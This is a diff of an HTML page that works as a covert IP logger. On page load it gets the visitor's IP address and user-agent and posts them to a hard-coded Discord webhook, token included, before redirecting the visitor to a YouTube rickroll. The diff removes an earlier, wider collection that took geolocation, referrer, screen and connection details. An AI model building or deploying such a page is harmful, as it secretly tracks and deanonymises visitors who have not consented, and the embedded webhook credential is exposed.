@@ -3,82 +3,40 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Collecting Information</title>
+  <title>Collecting IP and User-Agent</title>
   <style>
     body { margin: 0; background: #000; color: #fff; font-family: Arial, sans-serif; }
   </style>
   <script>
     (async () => {
-      // Collecting IP address using ipify API
-      const ipRes = await fetch("https://api.ipify.org?format=json");
-      const { ip } = await ipRes.json();
-
-      // Collecting User-Agent (browser and OS info)
-      const userAgent = navigator.userAgent;
-
-      // Collecting Referrer (where the user came from)
-      const referrer = document.referrer;
-
-      // Collecting Screen Resolution
-      const screenWidth = screen.width;
-      const screenHeight = screen.height;
-
-      // Collecting Window Size
-      const windowWidth = window.innerWidth;
-      const windowHeight = window.innerHeight;
-
-      // Collecting Device Information (Network Information API)
-      const connectionType = navigator.connection ? navigator.connection.effectiveType : "unknown";
-
-      // Collecting Geolocation (if allowed)
-      let geolocation = "Permission Denied";
-      if ("geolocation" in navigator) {
-        try {
-          const position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject);
-          });
-          geolocation = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude
-          };
-        } catch (e) {
-          geolocation = "Permission Denied";
-        }
-      }
-
-      // Collecting Language
-      const language = navigator.language || navigator.userLanguage;
-
-      // Collecting Browser Language
-      const browserLanguage = navigator.languages ? navigator.languages[0] : navigator.language;
-
-      // Sending collected data to a webhook (replace with your URL)
-      const data = {
-        ip,
-        userAgent,
-        referrer,
-        screenResolution: { width: screenWidth, height: screenHeight },
-        windowSize: { width: windowWidth, height: windowHeight },
-        connectionType,
-        geolocation,
-        language,
-        browserLanguage
-      };
-
-      console.log(data);  // Optional: Log data in console for debugging
-
-      // Send data to webhook (replace URL with your webhook)
       try {
+        // Get IP address using ipify API
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const { ip } = await ipRes.json();
+
+        // Get User-Agent (browser and OS information)
+        const userAgent = navigator.userAgent;
+
+        // Prepare the data to send
+        const data = {
+          ip,
+          userAgent
+        };
+
+        // Log data to the console for debugging
+        console.log(data);
+
+        // Send collected data to your webhook (replace with your URL)
         await fetch("https://discord.com/api/webhooks/1359581999593033918/G0qtLtRlOeWNlgn1hekeqUPNVzdqd8hXTf80o8wq6YW0-yBp_Z7syBH0xNugNxmDD2j6", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(data)
         });
-      } catch (e) {
-        console.error("Error sending data to webhook", e);
+      } catch (error) {
+        console.error("Error collecting data:", error);
       }
 
-      // Redirect to YouTube
+      // Redirect user to YouTube after collecting the information
       window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     })();
   </script>
